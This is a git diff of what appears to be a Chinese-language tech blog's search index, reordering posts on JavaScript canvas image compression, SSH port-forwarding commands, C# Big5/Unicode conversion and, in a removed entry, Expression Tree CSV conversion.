@@ -491,29 +491,6 @@
       </tags>
   </entry>
   <entry>
-    <title>如何將圖片壓縮並下載檔案</title>
-    <url>/2019/12/25/JsPictureCompress/</url>
-    <content><![CDATA[<h1 id="建立-HTML"><a class="header-anchor" href="#建立-HTML"></a>建立 HTML</h1>
-<p>首先在 HTML 建立一個 File Upload 與一個 canvas</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="綁定事件"><a class="header-anchor" href="#綁定事件"></a>綁定事件</h1>
-<p>接下來為 File Upload 綁定事件</p>
-<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;change&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 取得第一個檔案</span></span><br><span class="line">    <span class="keyword">const</span> file= <span class="variable language_">this</span>.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得 canvas</span></span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>);   </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 宣告 Image 物件</span></span><br><span class="line">    <span class="keyword">let</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建立 Image 載入事件</span></span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 在 canvas 載入圖片 </span></span><br><span class="line">        canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>).<span class="title function_">drawImage</span>(img,<span class="number">0</span>,<span class="number">0</span>,<span class="number">800</span>,<span class="number">600</span>); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 回收圖片物件</span></span><br><span class="line">        <span class="variable constant_">URL</span>.<span class="title function_">revokeObjectURL</span>(img.<span class="property">src</span>);   </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 canvas 圖片轉成 Blob 格式</span></span><br><span class="line">        canvas.<span class="title function_">toBlob</span>(<span class="function">(<span class="params">blob</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 宣告FileReader物件</span></span><br><span class="line">            <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 建立 FileReader 載入完成事件</span></span><br><span class="line">            reader.<span class="property">onloadend</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(reader.<span class="property">result</span>.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 讀取 Blob 格式物件</span></span><br><span class="line">            reader.<span class="title function_">readAsDataURL</span>(blob);</span><br><span class="line">        &#125;, <span class="string">&quot;image/jpeg&quot;</span>, <span class="number">0.8</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 圖片物件載入檔案</span></span><br><span class="line">    img.<span class="property">src</span> = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(file);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">MDN Canvas_API</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Javascript</category>
-      </categories>
-      <tags>
-        <tag>Javascript</tag>
-        <tag>Canvas</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>如何迭代 Js 物件</title>
     <url>/2020/03/27/JsIteratorObject/</url>
     <content><![CDATA[<h1 id="使用-for…in"><a class="header-anchor" href="#使用-for…in"></a>使用 for…in</h1>
@@ -541,6 +518,29 @@
       <tags>
         <tag>Javascript</tag>
         <tag>Object</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>如何將圖片壓縮並下載檔案</title>
+    <url>/2019/12/25/JsPictureCompress/</url>
+    <content><![CDATA[<h1 id="建立-HTML"><a class="header-anchor" href="#建立-HTML"></a>建立 HTML</h1>
+<p>首先在 HTML 建立一個 File Upload 與一個 canvas</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">&quot;canvas&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;800&quot;</span> <span class="attr">height</span>=<span class="string">&quot;600&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="綁定事件"><a class="header-anchor" href="#綁定事件"></a>綁定事件</h1>
+<p>接下來為 File Upload 綁定事件</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;input&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;change&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 取得第一個檔案</span></span><br><span class="line">    <span class="keyword">const</span> file= <span class="variable language_">this</span>.<span class="property">files</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得 canvas</span></span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;canvas&#x27;</span>);   </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 宣告 Image 物件</span></span><br><span class="line">    <span class="keyword">let</span> img = <span class="keyword">new</span> <span class="title class_">Image</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建立 Image 載入事件</span></span><br><span class="line">    img.<span class="property">onload</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 在 canvas 載入圖片 </span></span><br><span class="line">        canvas.<span class="title function_">getContext</span>(<span class="string">&#x27;2d&#x27;</span>).<span class="title function_">drawImage</span>(img,<span class="number">0</span>,<span class="number">0</span>,<span class="number">800</span>,<span class="number">600</span>); </span><br><span class="line"></span><br><span class="line">        <span class="comment">// 回收圖片物件</span></span><br><span class="line">        <span class="variable constant_">URL</span>.<span class="title function_">revokeObjectURL</span>(img.<span class="property">src</span>);   </span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 把 canvas 圖片轉成 Blob 格式</span></span><br><span class="line">        canvas.<span class="title function_">toBlob</span>(<span class="function">(<span class="params">blob</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 宣告FileReader物件</span></span><br><span class="line">            <span class="keyword">var</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 建立 FileReader 載入完成事件</span></span><br><span class="line">            reader.<span class="property">onloadend</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(reader.<span class="property">result</span>.<span class="title function_">split</span>(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 讀取 Blob 格式物件</span></span><br><span class="line">            reader.<span class="title function_">readAsDataURL</span>(blob);</span><br><span class="line">        &#125;, <span class="string">&quot;image/jpeg&quot;</span>, <span class="number">0.8</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">// 圖片物件載入檔案</span></span><br><span class="line">    img.<span class="property">src</span> = <span class="variable constant_">URL</span>.<span class="title function_">createObjectURL</span>(file);</span><br><span class="line">&#125;, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/API/Canvas_API">MDN Canvas_API</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Javascript</category>
+      </categories>
+      <tags>
+        <tag>Javascript</tag>
+        <tag>Canvas</tag>
       </tags>
   </entry>
   <entry>
@@ -619,35 +619,6 @@
         <tag>Ubuntu</tag>
         <tag>ODBC</tag>
         <tag>MSSQL</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用 SSH 建立通道</title>
-    <url>/2023/05/07/LinuxSshTunnel/</url>
-    <content><![CDATA[<h1 id="本機特定端口轉發至跳板機"><a class="header-anchor" href="#本機特定端口轉發至跳板機"></a>本機特定端口轉發至跳板機</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -g -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="跳板機轉發至本機特定端口"><a class="header-anchor" href="#跳板機轉發至本機特定端口"></a>跳板機轉發至本機特定端口</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -R 0.0.0.0:[跳板機端口]:localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<h1 id="請求轉發至跳板，可搭配-Whistle-做-Socks-代理"><a class="header-anchor" href="#請求轉發至跳板，可搭配-Whistle-做-Socks-代理"></a>請求轉發至跳板，可搭配 Whistle 做 Socks 代理</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -D localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
-<h1 id="ssh-執行選項說明"><a class="header-anchor" href="#ssh-執行選項說明"></a>ssh 執行選項說明</h1>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-L: 指定將本機上的特定端口轉發到遠端主機</span><br><span class="line">-R: 表示使用遠程端口轉發創建ssh隧道</span><br><span class="line">-D: port動態應用級端口轉​​發</span><br><span class="line">-p: 跳板機端口</span><br><span class="line">-C: 使用數據壓縮</span><br><span class="line">-c: cipher_spec選擇用於加密會話的密碼規範</span><br><span class="line">-f: 代表後台運行程序</span><br><span class="line">-F: configfile指定每個用戶的配置文件</span><br><span class="line">-N: 不要執行任何遠端指令</span><br><span class="line">-g: 允許遠程主機連接到本地轉發端口</span><br></pre></td></tr></table></figure>
-<!-- /etc/ssh/sshd_config 加入GatewayPorts 設定，能讓所有人都連到 -->
-<!-- scoop install putty
-plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP] -->
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://www.ssh.com/academy/ssh/command">SSH Command - Usage, Options, Configuration</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>Linux</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Ubuntu</tag>
-        <tag>Ssh</tag>
       </tags>
   </entry>
   <entry>
@@ -735,6 +706,35 @@ sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT -->
         <tag>Linux</tag>
         <tag>Ubuntu</tag>
         <tag>Nat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>使用 SSH 建立通道</title>
+    <url>/2023/05/07/LinuxSshTunnel/</url>
+    <content><![CDATA[<h1 id="本機特定端口轉發至跳板機"><a class="header-anchor" href="#本機特定端口轉發至跳板機"></a>本機特定端口轉發至跳板機</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -g -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<h1 id="跳板機轉發至本機特定端口"><a class="header-anchor" href="#跳板機轉發至本機特定端口"></a>跳板機轉發至本機特定端口</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -R 0.0.0.0:[跳板機端口]:localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<h1 id="請求轉發至跳板，可搭配-Whistle-做-Socks-代理"><a class="header-anchor" href="#請求轉發至跳板，可搭配-Whistle-做-Socks-代理"></a>請求轉發至跳板，可搭配 Whistle 做 Socks 代理</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -p [跳板機端口] -C -f -N -D localhost:[本地端口] [帳號]@[跳板機IP]</span><br></pre></td></tr></table></figure>
+<h1 id="ssh-執行選項說明"><a class="header-anchor" href="#ssh-執行選項說明"></a>ssh 執行選項說明</h1>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">-L: 指定將本機上的特定端口轉發到遠端主機</span><br><span class="line">-R: 表示使用遠程端口轉發創建ssh隧道</span><br><span class="line">-D: port動態應用級端口轉​​發</span><br><span class="line">-p: 跳板機端口</span><br><span class="line">-C: 使用數據壓縮</span><br><span class="line">-c: cipher_spec選擇用於加密會話的密碼規範</span><br><span class="line">-f: 代表後台運行程序</span><br><span class="line">-F: configfile指定每個用戶的配置文件</span><br><span class="line">-N: 不要執行任何遠端指令</span><br><span class="line">-g: 允許遠程主機連接到本地轉發端口</span><br></pre></td></tr></table></figure>
+<!-- /etc/ssh/sshd_config 加入GatewayPorts 設定，能讓所有人都連到 -->
+<!-- scoop install putty
+plink -v -x -a -T -C -noagent -ssh -pw "[密碼]" -P 50893 -L [本地端口]:[遠端服務IP]:[遠端服務端口] [帳號]@[跳板機IP] -->
+<div class="note warning"><p>📜 參考資料</p>
+<ol>
+<li><a href="https://www.ssh.com/academy/ssh/command">SSH Command - Usage, Options, Configuration</a></li>
+</ol>
+</div>]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>Ubuntu</tag>
+        <tag>Ssh</tag>
       </tags>
   </entry>
   <entry>
@@ -1041,32 +1041,6 @@ sudo iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT -->
       </tags>
   </entry>
   <entry>
-    <title>依字元內碼轉換 Big5 與 Unicode</title>
-    <url>/2022/05/22/NetBig5AndUnicode/</url>
-    <content><![CDATA[<h1 id="轉換-Big5-字元"><a class="header-anchor" href="#轉換-Big5-字元"></a>轉換 Big5 字元</h1>
-<p>Big5 依傳入內碼轉成字元</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立兩位元陣列</span></span><br><span class="line"><span class="built_in">byte</span>[] big5Bytes = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// big5 數字 0 內碼為 A2AF</span></span><br><span class="line"><span class="built_in">string</span> big5Code = <span class="string">&quot;A2AF&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼前兩字轉為16進制</span></span><br><span class="line">big5Bytes[<span class="number">0</span>] = (<span class="built_in">byte</span>)Convert.ToInt32(big5Code.Substring(<span class="number">0</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼後兩字轉為16進制</span></span><br><span class="line">big5Bytes[<span class="number">1</span>] = (<span class="built_in">byte</span>)Convert.ToInt32(big5Code.Substring(<span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立 big5 編碼</span></span><br><span class="line">Encoding big5 = Encoding.GetEncoding(<span class="number">950</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轉成字串</span></span><br><span class="line"><span class="built_in">string</span> result = big5.GetString(big5Bytes);</span><br></pre></td></tr></table></figure>
-<span id="more"></span>
-<h1 id="轉換-Unicode-字元"><a class="header-anchor" href="#轉換-Unicode-字元"></a>轉換 Unicode 字元</h1>
-<p>Unicode 依傳入內碼轉成字元，與 Big5 轉換的方法雷同，只需調整內碼放置的順序</p>
-<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立兩位元陣列</span></span><br><span class="line"><span class="built_in">byte</span>[] unicodeBytes = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unicode 數字 0 內碼為 FF10</span></span><br><span class="line"><span class="built_in">string</span> unicodeCode = <span class="string">&quot;FF10&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼後兩字轉為16進制</span></span><br><span class="line">unicodeBytes[<span class="number">0</span>] = Convert.ToByte(unicodeCode.Substring(<span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼前兩字轉為16進制</span></span><br><span class="line">unicodeBytes[<span class="number">1</span>] = Convert.ToByte(unicodeCode.Substring(<span class="number">0</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立 Unicode 編碼</span></span><br><span class="line">Encoding unicode = Encoding.Unicode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轉成字串</span></span><br><span class="line"><span class="built_in">string</span> result = unicode.GetString(unicodeBytes);</span><br></pre></td></tr></table></figure>
-<div class="note warning"><p>📜 參考資料</p>
-<ol>
-<li><a href="https://learn.microsoft.com/en-us/dotnet/api/system.text.encoding.getstring?view=net-8.0">Encoding.GetString Method</a></li>
-</ol>
-</div>]]></content>
-      <categories>
-        <category>.Net</category>
-      </categories>
-      <tags>
-        <tag>Linux</tag>
-        <tag>Font</tag>
-        <tag>.Net</tag>
-        <tag>Big5</tag>
-        <tag>Unicode</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>使用 lldb 分析 Dotnet 核心傾印檔案</title>
     <url>/2023/05/07/NetCoreDump/</url>
     <content><![CDATA[<h1 id="查詢服務資訊"><a class="header-anchor" href="#查詢服務資訊"></a>查詢服務資訊</h1>
@@ -1138,31 +1112,29 @@ dotnet-dump collect --process-id 1902 -->
       </tags>
   </entry>
   <entry>
-    <title>使用 Expression Trees 把 List&lt;T&gt; 轉成 CSV 字串</title>
-    <url>/2024/05/01/NetExpressionListToCsv/</url>
-    <content><![CDATA[<h1 id="宣告類別"><a class="header-anchor" href="#宣告類別"></a>宣告類別</h1>
-<p>類別內容如下</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">User</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> Name &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">int</span> Age &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>List 內容如下</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;User&gt; users = <span class="keyword">new</span> List&lt;User&gt;&#123;</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test1&quot;</span>,</span><br><span class="line">        Age = <span class="number">10</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="keyword">new</span> User &#123;</span><br><span class="line">        Name = <span class="string">&quot;Test2&quot;</span>,</span><br><span class="line">        Age = <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+    <title>依字元內碼轉換 Big5 與 Unicode</title>
+    <url>/2022/05/22/NetBig5AndUnicode/</url>
+    <content><![CDATA[<h1 id="轉換-Big5-字元"><a class="header-anchor" href="#轉換-Big5-字元"></a>轉換 Big5 字元</h1>
+<p>Big5 依傳入內碼轉成字元</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立兩位元陣列</span></span><br><span class="line"><span class="built_in">byte</span>[] big5Bytes = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// big5 數字 0 內碼為 A2AF</span></span><br><span class="line"><span class="built_in">string</span> big5Code = <span class="string">&quot;A2AF&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼前兩字轉為16進制</span></span><br><span class="line">big5Bytes[<span class="number">0</span>] = (<span class="built_in">byte</span>)Convert.ToInt32(big5Code.Substring(<span class="number">0</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼後兩字轉為16進制</span></span><br><span class="line">big5Bytes[<span class="number">1</span>] = (<span class="built_in">byte</span>)Convert.ToInt32(big5Code.Substring(<span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立 big5 編碼</span></span><br><span class="line">Encoding big5 = Encoding.GetEncoding(<span class="number">950</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轉成字串</span></span><br><span class="line"><span class="built_in">string</span> result = big5.GetString(big5Bytes);</span><br></pre></td></tr></table></figure>
 <span id="more"></span>
-<h1 id="產生-Expression-表達式"><a class="header-anchor" href="#產生-Expression-表達式"></a>產生 Expression 表達式</h1>
-<p>建立轉換方法</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Linq.Expressions;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="title">List</span>&lt;<span class="title">string</span>&gt; <span class="title">selectToCsv</span>&lt;<span class="title">T</span>&gt;(<span class="params"><span class="keyword">this</span> List&lt;T&gt; list, <span class="built_in">string</span> delimiter</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    Type source = <span class="keyword">typeof</span>(T);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得類別欄位</span></span><br><span class="line">    PropertyInfo[] prop = source.GetProperties();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 類別使用 t 表達 </span></span><br><span class="line">    ParameterExpression t = Expression.Parameter(source, <span class="string">&quot;t&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取得轉成字串方法</span></span><br><span class="line">    MethodInfo toString = <span class="keyword">typeof</span>(<span class="built_in">object</span>).GetMethod(<span class="string">&quot;ToString&quot;</span>);</span><br><span class="line"></span><br><span class="line">    List&lt;ConditionalExpression&gt; parameters = <span class="keyword">new</span> List&lt;ConditionalExpression&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (PropertyInfo p <span class="keyword">in</span> prop)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 類別欄位使用 t.Name, t.Age 表達</span></span><br><span class="line">        MemberExpression propertyValue = Expression.PropertyOrField(t, p.Name);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位進行字串轉換 t.Name.ToString(), t.Age.ToString()</span></span><br><span class="line">        MethodCallExpression propertyToString = Expression.Call(propertyValue, toString);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// NULL 值</span></span><br><span class="line">        ConstantExpression constantNull = Expression.Constant(<span class="literal">null</span>, <span class="keyword">typeof</span>(<span class="built_in">object</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 非字串型別欄位需進行字串轉換後，在做 NULL 判斷</span></span><br><span class="line">        BinaryExpression isNull = Expression.Equal(propertyToString, constantNull);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (p.PropertyType == <span class="keyword">typeof</span>(<span class="built_in">string</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 字串型別欄位直接進行 NULL 判斷</span></span><br><span class="line">            isNull = Expression.Equal(propertyValue, constantNull);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 空字串值</span></span><br><span class="line">        ConstantExpression constantEmpty = Expression.Constant(<span class="built_in">string</span>.Empty, <span class="keyword">typeof</span>(<span class="built_in">string</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// IIF 判斷 t.Name == null ? &quot;&quot; : t.Name.ToString()</span></span><br><span class="line">        ConditionalExpression ternary = Expression.Condition(isNull, constantEmpty, propertyToString);</span><br><span class="line"></span><br><span class="line">        parameters.Add(ternary);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 取得 Format 方法</span></span><br><span class="line">    MethodInfo formatMethod = <span class="keyword">typeof</span>(<span class="built_in">string</span>).GetMethod(<span class="string">&quot;Format&quot;</span>, BindingFlags.Static | BindingFlags.Public, <span class="literal">null</span>, <span class="keyword">new</span>[] &#123; <span class="keyword">typeof</span>(<span class="built_in">string</span>), <span class="keyword">typeof</span>(<span class="built_in">object</span>[]) &#125;, <span class="literal">null</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 產生類別欄位序號模板清單 [ &#123;0&#125;, &#123;1&#125; ]</span></span><br><span class="line">    List&lt;<span class="built_in">string</span>&gt; formatStrings = Enumerable.Range(<span class="number">0</span>, prop.Length).Select(count =&gt; <span class="string">$&quot;&#123;&#123;<span class="subst">&#123;count&#125;</span>&#125;&#125;&quot;</span>).ToList();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用符號 | 串聯成字串 &quot;&#123;0&#125;|&#123;1&#125;&quot;</span></span><br><span class="line">    ConstantExpression formatConstantExpression = Expression.Constant(<span class="built_in">string</span>.Join(delimiter, formatStrings));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生類別欄位轉換陣列</span></span><br><span class="line">    NewArrayExpression formatObjsExpression = Expression.NewArrayInit(<span class="keyword">typeof</span>(<span class="built_in">string</span>), parameters);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 產生 lambda 表達式</span></span><br><span class="line">    Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt; lambda = (Expression&lt;Func&lt;T, <span class="built_in">string</span>&gt;&gt;)Expression.Lambda(Expression.Call(formatMethod, formatConstantExpression, formatObjsExpression), t);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// t =&gt; Format(&quot;&#123;0&#125;|&#123;1&#125;&quot;, new [] &#123;IIF((t.Name == null), &quot;&quot;, t.Name.ToString()), IIF((t.Age.ToString() == null), &quot;&quot;, t.Age.ToString())&#125;)</span></span><br><span class="line"></span><br><span class="line">    IQueryable&lt;T&gt; queryable = list.AsQueryable();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queryable.Select(lambda).ToList();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h1 id="使用方法"><a class="header-anchor" href="#使用方法"></a>使用方法</h1>
-<p>執行方法轉換出 CSV 列表</p>
-<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">List&lt;<span class="built_in">string</span>&gt; csvList = users.selectToCsv(<span class="string">&quot;|&quot;</span>);</span><br></pre></td></tr></table></figure>
+<h1 id="轉換-Unicode-字元"><a class="header-anchor" href="#轉換-Unicode-字元"></a>轉換 Unicode 字元</h1>
+<p>Unicode 依傳入內碼轉成字元，與 Big5 轉換的方法雷同，只需調整內碼放置的順序</p>
+<figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 建立兩位元陣列</span></span><br><span class="line"><span class="built_in">byte</span>[] unicodeBytes = <span class="keyword">new</span> <span class="built_in">byte</span>[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Unicode 數字 0 內碼為 FF10</span></span><br><span class="line"><span class="built_in">string</span> unicodeCode = <span class="string">&quot;FF10&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼後兩字轉為16進制</span></span><br><span class="line">unicodeBytes[<span class="number">0</span>] = Convert.ToByte(unicodeCode.Substring(<span class="number">2</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 內碼前兩字轉為16進制</span></span><br><span class="line">unicodeBytes[<span class="number">1</span>] = Convert.ToByte(unicodeCode.Substring(<span class="number">0</span>, <span class="number">2</span>), <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 建立 Unicode 編碼</span></span><br><span class="line">Encoding unicode = Encoding.Unicode;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 轉成字串</span></span><br><span class="line"><span class="built_in">string</span> result = unicode.GetString(unicodeBytes);</span><br></pre></td></tr></table></figure>
 <div class="note warning"><p>📜 參考資料</p>
 <ol>
-<li><a href="https://learn.microsoft.com/en-us/dotnet/csharp/advanced-topics/expression-trees/">Expression Trees</a></li>
+<li><a href="https://learn.microsoft.com/en-us/dotnet/api/system.text.encoding.getstring?view=net-8.0">Encoding.GetString Method</a></li>
 </ol>
